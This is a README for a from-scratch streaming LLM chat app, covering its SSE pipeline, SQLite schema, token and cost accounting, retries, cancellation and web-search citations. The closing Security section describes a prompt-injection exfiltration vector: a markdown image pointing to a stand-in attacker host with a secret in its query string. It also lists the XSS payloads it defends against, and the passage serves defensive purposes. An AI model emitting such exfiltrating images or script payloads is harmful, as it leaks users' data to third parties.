# Streaming Chat

A small but production-shaped LLM chat product, built from scratch to understand how an LLM application really works: **FastAPI + OpenAI Responses API + Server-Sent Events + SQLite + React/TypeScript**. No LangChain, no agent framework, no abstraction layer. The OpenAI SDK is used directly so every important step is visible, including the tool-calling loop that lets the model search the web and cite its sources.

```
User → React → HTTP POST → FastAPI → conversation history (SQLite)
     → OpenAI Responses API (streaming) → deltas → FastAPI → SSE → React → tokens appear
```

## Contents

1. [Why this project exists](#why-this-project-exists)
2. [What it does](#what-it-does)
3. [Architecture](#architecture)
4. [Tech stack](#tech-stack)
5. [Project structure](#project-structure)
6. [Setup](#setup)
7. [Environment variables](#environment-variables)
8. [Database schema](#database-schema)
9. [API endpoints](#api-endpoints)
10. [Streaming architecture](#streaming-architecture)
11. [SSE explanation](#sse-explanation)
12. [History management](#history-management)
13. [Token accounting](#token-accounting)
14. [Cost accounting](#cost-accounting)
15. [Retry behavior](#retry-behavior)
16. [Cancellation](#cancellation)
17. [Failure handling](#failure-handling)
18. [Testing](#testing)
19. [Security](#security)
20. [Production improvements](#production-improvements)
21. [Troubleshooting](#troubleshooting)

## Why this project exists

Most "chatbot" tutorials hide the interesting parts behind a framework. The parts that make an LLM *product* hard are exactly the parts a toy skips:

- tokens arrive over time, so the transport and the UI must handle a **stream**;
- the model is **stateless**, so the app must rebuild and budget conversation history;
- every call costs money, so usage must be **measured per message**;
- providers and networks fail, so you need **bounded retries, cancellation and partial-response persistence**.

This project implements each of those directly.

## What it does

- Multiple persistent conversations (survive page refresh and server restart)
- Tokens appear live as the model generates them; **Stop** cancels generation
- Per-message token usage, cost and time-to-first-token; per-conversation total cost
- Token-budgeted history (long chats don't grow without bound)
- Retries only *before* the first token; partial replies are saved when a stream dies
- Clear UI states: empty, loading ("Thinking…"), streaming, complete, error, cancelled, partial, cut-off-at-output-limit
- Auto-generated conversation titles via a separate (optionally cheaper) model call

## Architecture

```
┌────────────────────────┐        ┌───────────────────────────────────────────┐        ┌────────────┐
│ Browser (React + TS)   │        │ FastAPI (Python)                          │        │ OpenAI     │
│                        │  POST  │                                           │        │            │
│  Chat.tsx              │───────▶│ main.py       routes, limits              │        │ Responses  │
│  api.ts  fetch +       │ {text} │ streaming.py  the pipeline                │ stream │ API        │
│   ReadableStream       │        │   1 save user msg           ┌──────────┐  │───────▶│            │
│  sse.ts  buffer+parse  │        │   2 create assistant row    │ SQLite   │  │ =True  │            │
│                        │◀───────│   3 build history ◀────────▶│ chat.db  │  │◀───────│ deltas     │
│  AbortController ──────┼─ abort─▶   4 call model (llm/)       └──────────┘  │ events │            │
│  (Stop button)         │  SSE   │   5 delta → SSE `delta`                    │        │            │
│                        │ events │   6 finalize row, send `done`              │        │            │
└────────────────────────┘        └───────────────────────────────────────────┘        └────────────┘
   no secrets here                  OPENAI_API_KEY lives only here (.env)
```

**The OpenAI key never reaches the browser.** The browser only talks to FastAPI.

### Why the layers are separated

| Layer | File | Knows about | Does *not* know about |
|---|---|---|---|
| HTTP | `app/main.py` | routes, validation, limits | OpenAI |
| Pipeline | `app/chat/streaming.py` | DB + LLM + SSE together | HTTP routing, OpenAI SDK types |
| Provider | `app/llm/client.py` | OpenAI SDK, retry, error mapping | the database, HTTP |
| History | `app/chat/history.py` | messages → budgeted history | everything else (pure functions) |
| Pricing | `app/llm/pricing.py` | tokens → dollars | everything else |
| Wire format | `app/chat/sse.py` | SSE text format | everything else |

Because `app/llm/client.py` is the *only* module that imports `openai`, the rest of the app is tested against a scripted stub and never needs the network.

## Tech stack

**Backend:** Python 3.10+, FastAPI, Uvicorn, official OpenAI Python SDK (Responses API), SQLite (stdlib `sqlite3`), Pydantic, pytest.
**Frontend:** React 19, TypeScript, Vite, `react-markdown` (the only runtime dependency beyond React), Vitest.
**Not used (on purpose):** LangChain, LangGraph, Anthropic, Redis, Kafka, vector DBs, auth. (The agent loop is hand-written in `app/llm/client.py`.)

## Project structure

```
Streaming-Chat-App/
├── AI/                           the Python service
│   ├── app/
│   │   ├── main.py           create_app(): routes, CORS, body-size cap, rate limit, 409 guard
│   │   ├── config.py         Settings from env; fails fast with actionable messages
│   │   ├── schemas.py        Pydantic request/response models
│   │   ├── db.py             SQLite schema + data access
│   │   ├── chat/
│   │   │   ├── streaming.py  begin_turn() + stream_reply(): THE pipeline
│   │   │   ├── history.py    approx_tokens(), build_history() (budgeted, summary-aware)
│   │   │   ├── memory.py     plan_summary() + MemoryManager: the rolling summary
│   │   │   ├── usage_report.py  build_usage_report(): the numbers behind the Usage page
│   │   │   └── sse.py        sse(event, data) wire formatter
│   │   ├── llm/
│   │   │   ├── client.py     OpenAI Responses API: stream(), retry, error mapping, titles
│   │   │   ├── usage.py      parse_usage(): provider-reported token usage
│   │   │   ├── pricing.py    PriceTable, cost = tokens × price / 1M (None if unpriced)
│   │   │   └── accounting.py usage columns + recording title/summary call costs
│   │   ├── tools/
│   │   │   ├── web_search.py  Tavily search -> numbered sources (safe errors, http(s) URLs only)
│   │   │   └── registry.py    web_search tool definition + per-reply ToolRunner (citation numbering)
│   │   └── core/
│   │       ├── limits.py     BodySizeLimitMiddleware, SlidingWindowLimiter
│   │       └── fx.py         USD→INR display rate
│   ├── data/
│   │   ├── prices.toml       model prices YOU fill in (no invented prices)
│   │   └── chat.db           SQLite database (git-ignored, created on first run)
│   ├── tests/                170+ tests
│   ├── requirements.txt
│   └── pytest.ini
├── frontend/src/
│   ├── api.ts            fetch + stream reader (POST + SSE)
│   ├── sse.ts            incremental SSE parser (buffering) + sse.test.ts
│   ├── Chat.tsx          conversation state machine, Stop/AbortController
│   ├── Message.tsx       plain text while streaming → sanitized Markdown after
│   ├── Usage.tsx         the Usage page: spend, tokens, cache hit rate, savings (hand-drawn SVG/CSS charts)
│   ├── chart.ts          pure chart helpers (nice axis, ticks, labels) + chart.test.ts
│   ├── App.tsx           sidebar, URL-hash routing
│   └── styles.css
├── run.sh                launcher: backend + frontend
├── .env.example · .gitignore · README.md
```

## Setup

Requirements: Python 3.10+, Node 20+.

**Fastest way:** create `.env` (`cp .env.example .env`, set `OPENAI_API_KEY` and `OPENAI_MODEL`), then

```bash
./run.sh           # OpenAI from .env (each chat message costs money)
```

It creates the venv / installs `node_modules` on first run, validates your config before starting (clear error if the key or model is missing, a note if the model has no price in `prices.toml`), starts the backend (`--reload`) and frontend, and **Ctrl+C stops both**. Starting the app makes no OpenAI request; only sending a message does. Backend: http://localhost:8501, frontend: http://localhost:3100 (Vite prints the actual URL and moves to the next port if 3100 is busy). Options: `--backend-port N`, `--frontend-port N`.

Manual setup, step by step:

```bash
# 1. Backend
cd AI
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt

# 2. Configuration (repo root)
cp ../.env.example ../.env       # then edit .env

# 3. Run the API  (http://localhost:8501, interactive docs at /docs)
python -m uvicorn app:app --reload --port 8501

# 4. Frontend (new terminal)
cd frontend
npm install
VITE_API_URL=http://localhost:8501 npm run dev -- --port 3100
```

### Configuring OpenAI

1. In `.env`: `OPENAI_API_KEY=...`, `OPENAI_MODEL=<a model id your account can use>`.
2. Add that model to `AI/data/prices.toml` (current price from OpenAI's pricing page) or costs will show as "cost n/a".
3. Without a valid key/model the server **refuses to start** and says what to change.

## Web search and citations

The model can search the web by itself. It decides when (recent events, versions, prices), and a **Search** toggle next to the send button turns it off per browser. With no `TAVILY_API_KEY` the tool is not offered and the toggle is hidden.

```
Browser ── message ──▶ FastAPI ──▶ OpenAI (tools: web_search)
                         ▲            │ function_call: web_search("...")
                         │            ▼
                         └── Tavily ◀── we run it (our key), number the results [1] [2] ...
                                      │ function_call_output
                                      ▼
                      OpenAI ── answer with inline [1] [2] ──▶ SSE ──▶ browser (chips + source cards)
```

- The loop lives in `OpenAILLM._stream_agent`. Each round is one streamed request; when a round ends with a function call we run the tool, append the model's output items (including encrypted reasoning, needed because `store=False`) and a `function_call_output`, and ask again. The loop ends when a round has no function call, and there is no cap on the number of searches (Stop always cancels, and each round is bounded by `MAX_OUTPUT_TOKENS`).
- Retries wrap a single round and tools run only after a round completes, so a retried request never repeats a search. Token usage and cost are summed over all rounds.
- The UI shows `tool_call`/`tool_result` live, then renders `[n]` as clickable chips and lists the sources under the reply. Sources are stored with the message (`messages.sources`), so they survive a refresh. Markers that match no source stay plain text.
- Citation numbers belong to one reply. The system prompt tells the model never to reuse markers from earlier messages.
- Search cost is counted (`web_searches` per reply), not priced.

## Environment variables

See [.env.example](.env.example) for the annotated file.

| Variable | Default | Purpose |
|---|---|---|
| `OPENAI_API_KEY` | – | secret; backend only |
| `OPENAI_MODEL` | – | **required** (this project is configured with `gpt-5.6-luna` in `.env`); no default in code on purpose |
| `OPENAI_TITLE_MODEL` | `OPENAI_MODEL` | cheaper model for titles (model routing) |
| `TAVILY_API_KEY` | – | enables the web search tool; empty = tool not offered |
| `WEB_SEARCH_MAX_RESULTS` | `5` | results the model gets per search |
| `OPENAI_TIMEOUT_S` | `60` | connect/inter-chunk timeout |
| `MAX_OUTPUT_TOKENS` | `1024` | cap on generated tokens per reply |
| `HISTORY_BUDGET_TOKENS` | `6000` | budget for past messages (not the context window) |
| `MEMORY_SUMMARY_ENABLED` | `true` | fold old messages into a rolling summary instead of dropping them |
| `OPENAI_SUMMARY_MODEL` | title model | model that writes the summaries |
| `MAX_MESSAGE_CHARS` | `8000` | max user message size (413 above) |
| `RATE_LIMIT_PER_MINUTE` | `20` | per-IP chat requests; `0` disables |
| `LLM_MAX_ATTEMPTS` | `2` | total attempts per reply (1 = no retry) |
| `RETRY_BASE_DELAY_S` | `0.5` | backoff base |
| `PARTIAL_FLUSH_INTERVAL_S` | `1.0` | checkpoint partial text to SQLite this often |
| `DATABASE_PATH` · `PRICES_PATH` | `data/chat.db` · `data/prices.toml` | relative to `AI/` |
| `CORS_ORIGINS` | (empty) | empty = any `localhost` port (dev); set exact origins in prod |
| `USD_TO_INR` | `auto` | `auto` = live USD→INR rate (cached 6 h), a number = fixed rate, `0` = hide INR |
| `USD_TO_INR_FALLBACK` | `96` | rate used only if the live lookup never succeeded |
| `LOG_LEVEL` | `INFO` | |

## Database schema

```sql
conversations(id PK, title, created_at, updated_at)

messages(
  id PK,
  conversation_id  → conversations(id) ON DELETE CASCADE,
  role             'user' | 'assistant',
  content          TEXT,
  status           'streaming' | 'complete' | 'cancelled' | 'error',
  input_tokens, cached_input_tokens,           -- NULL = unavailable (never estimated)
  output_tokens, reasoning_tokens, total_tokens,
  cost_usd,                                    -- NULL = no price configured (not 0)
  stop_reason,                                 -- completed | max_output_tokens | content_filter | cancelled | error | interrupted
  model (requested), served_model (reported by OpenAI),
  ttft_ms, latency_ms,                         -- extras: measured facts about the reply
  created_at)

idx_messages_conversation (conversation_id, created_at)   -- load a chat
idx_conversations_updated (updated_at DESC)               -- sidebar order
idx_messages_streaming    (status) WHERE status='streaming'  -- partial index: crash recovery
```

- **Why two tables?** A conversation has one title and owns many messages; merging them would repeat the title on every row and make "list my chats" scan all messages.
- **Why a foreign key?** The database itself refuses an orphan message and cascades deletes. Integrity is enforced in one place (note: SQLite needs `PRAGMA foreign_keys=ON` per connection; `db.connect()` does it).
- **Why tokens live on the assistant message?** Tokens are consumed by one model call, which produces exactly one assistant message. Per-message cost is a column; per-conversation cost is a `SUM`.
- **Why `status`?** A reply is a process, not an instant. Without it you can't tell a finished answer from one that died halfway.

### Assistant message lifecycle

```
                 INSERT (before the model is called)
                          │  content = "", status = streaming
                          ▼
                   ┌─────────────┐
                   │  streaming  │◀── content checkpointed every PARTIAL_FLUSH_INTERVAL_S
                   └──────┬──────┘
        ┌─────────────────┼──────────────────────┐
        ▼                 ▼                      ▼
   ┌──────────┐      ┌─────────┐          ┌───────────┐
   │ complete │      │  error  │          │ cancelled │
   └──────────┘      └─────────┘          └───────────┘
```

| Transition | Trigger | What's stored |
|---|---|---|
| streaming → **complete** | provider sends `response.completed` / `response.incomplete` | full text, exact usage, cost, TTFT, latency, `stop_reason` (`completed`, `max_output_tokens`, …) |
| streaming → **error** | provider/network failure, or stream ended with no terminal event | partial text kept, `stop_reason=error`; SSE `error` event sent |
| streaming → **cancelled** | browser disconnected (Stop, tab closed) | partial text kept, `stop_reason=cancelled`; no event (nobody listening) |
| streaming → **error** *(recovery)* | server killed mid-stream; at next startup | last checkpointed text kept, `stop_reason=interrupted` |

A row never leaves `complete`/`error`/`cancelled`. History building skips `error` and unfinished rows but keeps `cancelled` partials (the user saw that text).

## API endpoints

| Method & path | Purpose |
|---|---|
| `GET /health` | `{"status":"ok"}` |
| `POST /conversations` | create → `201 {id,title,created_at,updated_at}` |
| `GET /conversations` | list, most recently active first |
| `GET /conversations/{id}` | `{id,title,messages:[…],total_cost_usd,total_tokens,unpriced_messages}` |
| `POST /conversations/{id}/messages` | body `{"text":"…"}` → **SSE stream** (what the UI uses) |
| `POST /conversations/{id}/messages/sync` | same, **non-streaming** JSON (teaching baseline; try it with `curl`) |
| `GET /info` | `{model, usd_to_inr, usd_to_inr_source, usd_to_inr_as_of, web_search_available}` |
| `GET /usage?days=30&utc_offset_minutes=330` | spend, tokens, cache hit rate and savings, daily series, by purpose / model, top chats (days follow the caller's clock) |

Errors before streaming starts are plain HTTP: `404` unknown conversation · `422` empty text · `413` too large · `409` a reply is already streaming in this conversation · `429` rate limited (with `Retry-After`).

## Streaming architecture

`app/chat/streaming.py` is the heart. For `POST /conversations/{id}/messages`:

```
1. validate (size, rate limit, 409 guard)                  main.py: prepare_send
2. INSERT user message                                      begin_turn
3. INSERT assistant row  content="" status=streaming        begin_turn   ← BEFORE the model call
4. history = build_history(rows from DB, budget)            begin_turn
5. return StreamingResponse(stream_reply(...))
6. async for event in llm.stream(history):                  stream_reply
       TextDelta  → buffer, checkpoint, yield sse("delta")
       Completed  → remember stop_reason + usage
7. finally: write terminal status (complete/error/cancelled) — ONE place, every exit path
8. yield sse("done") or sse("error")
9. first completed reply? → title call → yield sse("title")
```

**Why create the assistant row before streaming?** If the process dies mid-stream, without the row the reply simply never existed (user sees a question followed by nothing, and you can't tell what happened). With it, a record exists with status and the last checkpointed text; startup recovery turns it into a visible `error`.

**Normal vs streaming request:**

```
Normal:     request ──── wait ... wait ... wait ────▶ complete response
Streaming:  request ──▶ token token token token ──▶ complete response
```
Total generation time is similar; **perceived** latency (time to first token) drops from "the whole answer" to a fraction of a second.

## SSE explanation

```python
def sse(event: str, data: dict) -> str:
    return f"event: {event}\ndata: {json.dumps(data)}\n\n"

sse("delta", {"text": "Hello"})   # →  'event: delta\ndata: {"text": "Hello"}\n\n'
```

```
event: delta
data: {"text": "Hello"}
<blank line>
```

- `event:` names the type so the client can switch on it. `data:` carries one line of JSON.
- **Two newlines**: the first ends the `data:` line, the second (a blank line) ends the *event*. SSE is line-based: the receiver accumulates fields and dispatches when it sees an empty line.
- `json.dumps` never emits a raw newline inside a string, so `data:` is guaranteed to stay on one line.
- It suits one-way server→client streaming: plain HTTP (proxies, auth, `curl`), trivially debuggable.
- **SSE ≠ WebSockets.** WebSockets upgrade to a separate full-duplex protocol; use them when the client also streams data continuously (voice, collaborative editing, games). Here the client sends one request and gets a stream back.

### Events this app emits

| Event | Payload | Client reaction |
|---|---|---|
| `start` | `user_message_id, assistant_message_id, history_messages, history_truncated, history_summarized` | swap temp ids for real ids; show the summarized/truncation note |
| `delta` | `{text}` | append text immediately |
| `done` | `stop_reason, usage{input,cached_input,output,reasoning,total}, cost{input_cost,cached_input_cost,output_cost,total_cost,cache_savings}, requested_model, served_model, ttft_ms, latency_ms, web_searches, conversation_total_*` (usage/cost are `null` when unavailable) | stop loading/Stop button, show tokens + cost, render Markdown |
| `error` | `{message, partial}` | keep partial text, show safe message |
| `tool_call` | `{id, name, query}` | show "Searching the web for …" (the model asked for a search) |
| `tool_result` | `{id, name, sources:[{n,title,url,snippet}], error}` | mark the search done; remember the sources for `[n]` citations |
| `title` | `{title}` | update sidebar |

### Why `fetch()` and not `EventSource`

`EventSource` only does `GET` with no body or custom headers. Our request is `POST` with a JSON body, so `api.ts` uses `fetch()` and reads `response.body` as a stream (also: we want **no** auto-reconnect, since re-POSTing would duplicate the user's message).

### The client parser and why it buffers

```ts
const reader = res.body.pipeThrough(new TextDecoderStream()).getReader();
const parser = new SSEParser();            // keeps a buffer between chunks
while (true) {
  const { value, done } = await reader.read();
  if (done) break;
  for (const evt of parser.push(value)) dispatch(evt);   // 0, 1, or many events per chunk
}
```

**A network chunk is not an SSE event.** TCP guarantees order, not boundaries:

```
chunk 1:  event: delta\ndata: {"text":"Hel
chunk 2:  lo"}\n\n
```
Parsing chunk 1 alone would throw. The parser appends to a buffer and only emits events terminated by `\n\n`; the remainder waits for more bytes. `TextDecoderStream` solves the same problem one level down: a multi-byte UTF-8 character (emoji, accents) can be split across chunks, and it holds partial bytes until the character is whole. Both are covered by tests (`sse.test.ts` feeds the stream one character at a time).

### Markdown while streaming

Streaming text is rendered as **plain text**; Markdown is rendered once, after `done`. A half-received document is often invalid Markdown (an unclosed ``` fence swallows everything after it; `**bo` has no closing marker; a table is cut mid-row), so re-parsing on every token makes the layout jump and flicker.

## History management

LLMs are **stateless**: every request must contain the conversation the model should know about. Each turn, `begin_turn` rebuilds history **from SQLite** (never from what the browser says), then `build_history` (`app/chat/history.py`):

1. drop `error`, still-`streaming` and empty/whitespace messages (keep `complete` and `cancelled`)
2. walk **newest → oldest**, adding messages while `used + cost ≤ HISTORY_BUDGET_TOKENS`; stop at the first that doesn't fit
3. reverse back to chronological order
4. drop leading assistant messages so history **starts with a user turn**
5. edge case: if the newest user message alone exceeds the budget it is still sent (an empty prompt would be worse; its size is capped by `MAX_MESSAGE_CHARS`)

Messages are kept as plain `{"role","content"}` dicts; `llm.to_openai_input()` is the only place that converts to the provider's format, so a different provider changes one function.

`approx_tokens(text) = len(text)//4 + 4` is **an approximation, not the tokenizer**: other languages, code and emoji tokenize differently. It only needs to be roughly right for budgeting; billing uses the provider's exact `usage`. Upgrade path: swap in the model's real tokenizer behind the same signature.

**Context window vs history budget.** The window is the model's hard limit for *everything* in a request. We deliberately budget history below it so there is room for the rest:

```
context window  ≥  instructions  +  HISTORY_BUDGET  +  new input  +  MAX_OUTPUT_TOKENS (+ margin)
```

**Rolling-summary memory.** Plain truncation silently forgets old messages, so long chats lose context. Instead, the oldest messages are folded into a short summary and every request sends `[summary] + recent messages`:

```
old messages ──summarize──▶ [summary]  +  recent messages (verbatim)  ──▶ LLM
```

- **When.** `plan_summary()` (`app/chat/memory.py`, a pure function) waits until the not-yet-summarized messages exceed 80 % of `HISTORY_BUDGET_TOKENS`, then folds the oldest ones until about 40 % remains verbatim. Summarizing in big, rare steps (hysteresis) keeps the start of the prompt identical between steps, which is what prompt caching needs.
- **How.** After a reply completes, a background task (`MemoryManager`) asks the model to merge the newly old messages into the existing summary. It never delays a reply, runs one conversation at a time, and never raises: if the call fails the old summary stays and truncation still protects the budget.
- **Storage.** `conversations.summary` plus `summary_through_id` (the last message the summary covers). Messages are never deleted or changed; only what is *sent* changes.
- **What the model sees.** A `developer` message ("Summary of the earlier conversation…") first, then the messages after the boundary. The summary counts against the budget, and the verbatim part always opens with a user turn.
- **Cost.** Summary and title calls are recorded in the `llm_calls` table with their usage and cost (no foreign key, so spend history survives deleting a chat). Summaries use `OPENAI_SUMMARY_MODEL`, falling back to the (cheap) title model.
- **Trade-offs.** A summary can lose or distort details, and it costs an extra call each time the boundary moves. Turn it off with `MEMORY_SUMMARY_ENABLED=false`.

## Token accounting

**Old approach** (still used ONLY to size the history budget *before* a request exists): estimate tokens from text length, `len(text) // 4 + 4`. That is a rough guess.

**New approach for usage and cost: nothing is estimated.**

```
OpenAI generates the response
        ↓
OpenAI reports ACTUAL usage in its final stream event
        ↓
llm/usage.py     parse_usage()      → Usage record (missing optional fields → None)
        ↓
llm/pricing.py   PriceTable.cost()  → CostBreakdown from prices.toml (None if unpriced)
        ↓
db.py            stores usage + cost on the assistant message
        ↓
SSE `done` event + UI show exactly those stored numbers
```

What OpenAI reports, and how each field is stored:

| Field | Meaning | Note |
|---|---|---|
| `input_tokens` | everything we sent (instructions + history + new message) | **includes** the cached part |
| `cached_input_tokens` | the part of the input served from OpenAI's prompt cache | a **subset** of `input_tokens`, billed at a lower rate; `NULL` if not reported |
| `output_tokens` | everything the model generated | **includes** reasoning tokens |
| `reasoning_tokens` | tokens the model spent "thinking" before the visible answer | a **subset** of `output_tokens`; stored for observability only; `NULL` if not reported |
| `total_tokens` | input + output | as reported |

`NULL` means "unavailable", never 0. If OpenAI sends no usage (a stopped or failed reply), the columns stay `NULL` and the UI says **Usage unavailable**. Usage is stored for a stopped reply only if the provider had already reported it. Tokens may still have been billed by OpenAI; we only store what it told us.

Also stored per reply: `model` (the **requested** model, from `OPENAI_MODEL`) and `served_model` (what OpenAI says it actually served, which may be a dated snapshot of the alias). The UI shows the served model.

## Prompt caching

OpenAI caches the **prefix** of a long prompt (1,024+ tokens) and bills the cached part at a fraction of the normal input rate. It only works for an *exact* repeated prefix, so the request is built to keep everything before the newest message stable:

```
static instructions → static tool definitions → rolling summary → append-only history → new message
```

- Nothing dynamic goes into the instructions (no timestamps), and the summary only changes when the boundary moves in a big step (see *Rolling-summary memory*).
- Each reply request sends `prompt_cache_key = conversation id`, which routes a chat's requests to the same cache.
- Verified against the real API: the same ~2,400-token prompt sent twice came back with 2,439 of 2,442 input tokens cached on the second call, and the call cost about 86% less.
- **Savings** = `cached_tokens × (input_price − cached_input_price) / 1M`, i.e. what those tokens would have cost uncached minus what they cost. It is informational only (never subtracted again from the cost). It is shown per reply ("saved $…") and in total on the Usage page. It is `null` if cached tokens exist but the model has no cached price.

## Usage page

`#/usage` (sidebar link) shows the last 7 / 30 / 90 days: total spend (USD with INR), tokens, cache hit rate, money saved by caching, web searches, a daily-spend chart, spend by purpose (replies / chat titles / memory summaries), spend by model and the most expensive chats. Everything comes from stored rows: replies carry their own usage and cost, and title/summary calls are in `llm_calls`. A call with no configured price is counted as *unpriced* and the total is flagged as a lower bound, never counted as $0. Days follow the browser's clock (it sends its UTC offset). Deleting a chat removes its content but **not its cost**: each reply's usage numbers (tokens, cost, searches, original date; never the text) are copied to `archived_replies` in the same transaction, so spend history stays true. A deleted chat just can't appear in "most expensive chats", since there is nothing left to link to.

## Cost accounting

```
non_cached_input = input_tokens − cached_input_tokens

cost =  non_cached_input × input_price         / 1,000,000
      + cached_input     × cached_input_price  / 1,000,000
      + output_tokens    × output_price        / 1,000,000
```

Example (`gpt-5.6-luna`: $0.20 input, $0.02 cached input, $1.20 output per 1M), usage `input=1000, cached=200, output=300`:

```
800 non-cached × $0.20 / 1M = $0.000160
200 cached     × $0.02 / 1M = $0.000004
300 output     × $1.20 / 1M = $0.000360
                       total = $0.000524
```

Rules the code enforces (each has tests):
- cached tokens are charged at the cached rate and **never also** at the normal input rate;
- reasoning tokens are already inside `output_tokens`, so they are **not added again**;
- arithmetic uses `Decimal`, converted to float only for JSON/SQLite;
- the price entry is looked up by the **served** model; a dated snapshot of a priced alias (`<alias>-YYYY-MM-DD`) uses the alias price; **any other model → `cost = null` + a warning** `Pricing not configured for model: …`. The reply still succeeds. A wrong number in a cost UI is worse than a blank;
- cached tokens reported for a model with no `cached_input` price → cost left unknown (no guessing).

Prices live in [`AI/data/prices.toml`](AI/data/prices.toml) (not in code):

```toml
[models."gpt-5.6-luna"]
input        = 0.20   # USD per 1M non-cached input tokens
cached_input = 0.02   # optional
output       = 1.20
```
The `gpt-5.6-luna` and `gpt-5.4-mini` entries were supplied by the project owner and are not verified by the app. Re-check OpenAI's pricing page.

**INR next to USD.** OpenAI bills in USD, so USD is the stored, real amount. The UI shows an INR equivalent beside every cost (per reply and conversation total), computed with `USD_TO_INR`: `auto` fetches the current market rate from a free public API (`AI/app/core/fx.py`, cached 6 hours, falls back to `USD_TO_INR_FALLBACK` if the lookup fails, and never breaks the app). Hover the cost to see the rate, its source (`live`/`fallback`/`fixed`) and timestamp. It is a display conversion only, not what your card or bank will charge. The rate was about ₹96.4/$ on 2026-10-06; a hardcoded value goes stale.

**UI:** each reply shows `Input: N tokens sent (K cached)`, `Output: N tokens received (R reasoning)`, total and `Cost: $… · ₹…`; the conversation header shows total input, output, total tokens and cost. The conversation cost is `SUM(cost_usd)` over stored message costs; unpriced replies are excluded and counted in `unpriced_messages` (so the total is labelled as incomplete). Title-generation calls are not attributed to any message. Costs are floats in SQLite (use integer micro-dollars for invoicing).

**Existing databases:** `Database.init_schema()` adds the new columns (`cached_input_tokens`, `reasoning_tokens`, `served_model`) to older database files automatically.

## Retry behavior

`llm.stream_with_retry()` wraps one streaming attempt. The rules:

| Situation | Action |
|---|---|
| failure **before the first text delta**, transient | retry (bounded, exponential backoff + jitter, honors `Retry-After` capped at 8 s) |
| failure **after the first delta** | **never retry**; keep partial text; send `error` |
| non-transient (400/401/403/404, `insufficient_quota`) | fail immediately |
| attempts exhausted (`LLM_MAX_ATTEMPTS`, default 2) | fail |

Transient = connection errors/timeouts, 5xx, 408/409, and 429 *rate limits* (but **not** `insufficient_quota`: out of money isn't transient).

**Why never after the first token?** The user (and the database) already hold `"Hello my"`. A new attempt generates its own answer from the start, and generation is sampled, so it will not reproduce the same words. Appending gives `"Hello myHello my name is…"`; replacing makes visible text vanish. Neither is correct, so we stop. Also, the SDK's own retries are disabled (`max_retries=0`) because the SDK can't know whether tokens already reached the user. Retried attempts can also be billed, another reason to keep the count small.

Try it free: `/flaky` (retried, succeeds), `/down` (exhausts), `/fail` (retryable error but *not* retried because text was sent).

## Cancellation

```
Stop clicked → AbortController.abort() → fetch rejects, browser closes the TCP connection
            → ASGI server reports http.disconnect
            → stream_reply notices (request.is_disconnected(), or the task is cancelled)
            → upstream stream closed (aclosing / stream.close()) → OpenAI stops generating
            → row saved: status=cancelled, partial text kept
```

Hiding the UI is **not** cancellation. If the backend never learns the client left, the model keeps generating (and you keep paying) for tokens nobody reads. Two signals are handled: `request.is_disconnected()` polled between deltas, and `asyncio.CancelledError` when the server cancels the task while we're blocked waiting for the next token. The database writes are synchronous, so a cancelled task can't be interrupted mid-save. Verified with a real TCP disconnect against a live Uvicorn server (`tests/test_cancellation_live.py`).

Caveat to know: tokens generated *before* the provider noticed the disconnect may still be billed, and a cancelled reply's usage isn't recorded because the final event never arrives.

## Failure handling

- Mid-stream failure → partial text saved with `status=error`; the UI keeps the partial text and shows a notice. It is **never** replaced by a blank bubble.
- The browser receives `event: error {message, partial}` with a short **safe** message ("The model is unavailable right now."). Raw exceptions can leak internals (URLs, request ids, config); full detail goes to server logs only.
- A stream that ends without the provider's terminal event is treated as an **error**, not silently marked complete.
- `stop_reason=max_output_tokens` → UI says "Response was cut off because it reached the output limit."
- Server killed mid-stream → at next startup orphaned `streaming` rows become `error` (`interrupted`), keeping the last checkpoint (≤ 1 s of text lost by default).
- Title generation failures fall back to a title from the first words (and are logged).

## Testing

```bash
cd AI && source .venv/bin/activate && pytest -q          # 160+ tests, ~3 s, no network
cd frontend && npm run typecheck && npm test                   # TS typecheck + 8 SSE parser tests
```

| File | Covers |
|---|---|
| `test_history.py` | budget respected, newest preferred, errors/empty skipped, starts with user |
| `test_usage_report.py` | the Usage page's numbers: totals, cache hit rate and savings, day bucketing in the user's timezone, deleted chats, unpriced calls |
| `test_memory.py` | when to summarize (hysteresis), what history looks like with a summary, the background manager (merge, failure, concurrency, deleted chat) |
| `test_pricing.py` | known/unknown model, calculation, TOML loading/validation, no invented prices |
| `test_sse.py` | exact wire format, JSON payload, newline safety |
| `test_db.py` | create/get/update/list, FK + CHECK constraints, crash recovery, totals |
| `test_streaming_failure.py` | **stream failure** (`"Hello "`, `"world"`, then raise → DB `"Hello world"` + `error` + SSE error event), no leaked internals, cancellation (disconnect + task cancel), checkpointing, placeholder row |
| `test_retry.py` | retry before first token, **no retry after**, bounded, backoff, `Retry-After` |
| `test_llm.py` | OpenAI adapter against a stub SDK client: request shape, event mapping, error classification, the agent loop (tool call → output → answer, summed usage, parallel calls, no search limit, retries never repeat a search) |
| `test_web_search.py` | Tavily parsing, URL filtering, safe errors, citation numbering across searches |
| `test_api.py` | endpoints, history reaches the model, titles, 413/422/409/429, restart persistence |
| `test_cancellation_live.py` | real Uvicorn + real TCP disconnect |
| `test_limits_config.py` | rate limiter, config validation |

**Unit tests never call OpenAI.** They use a scripted stub: *fast and deterministic*. Real-API tests are *slow, expensive and network-dependent*. A `conftest.py` safety net makes any accidental real network call from the OpenAI SDK **fail the test** instead of spending money. I also sabotaged the production code (dropping the partial-text save, dropping the stream close) to confirm those tests actually fail.

## Security

- **API key:** only in the server's env/`.env` (git-ignored). The browser talks to FastAPI, never to OpenAI. The Vite bundle contains no secret (anything `VITE_*` is public).
- **Input size:** `MAX_MESSAGE_CHARS` (413) plus a pure-ASGI body cap checked from `Content-Length` before the body is read. Why: abuse and **cost** (input tokens are money), **context overflow**, and denial of service. (A chunked request has no `Content-Length`; in production also cap at the reverse proxy.)
- **Rate limiting:** minimal in-memory sliding window per IP (429). Production: per-user, shared store (see below).
- **One reply at a time per conversation** (409): prevents interleaved generations.
- **Logging:** structured `key=value` lines with ids, model, tokens, cost, latency, status, error *type*. **Conversation text is never logged by default**: prompts routinely contain personal or confidential data, and logs are widely accessible and long-lived.
- **Safe errors:** raw exception text never reaches the browser.
- **LLM output is untrusted.** It can be steered by whatever the model read (prompt injection). `Message.tsx` renders Markdown with `react-markdown` (no `dangerouslySetInnerHTML`, raw HTML shown as inert text, `javascript:` URLs stripped), **removes images** (a rendered `![](https://attacker/?q=<secret>)` makes the browser exfiltrate data), and opens links with `rel="noopener noreferrer"`. Verified in a real browser: `<img onerror>`, `<script>`, `javascript:` links and remote images produce no elements and no alert.
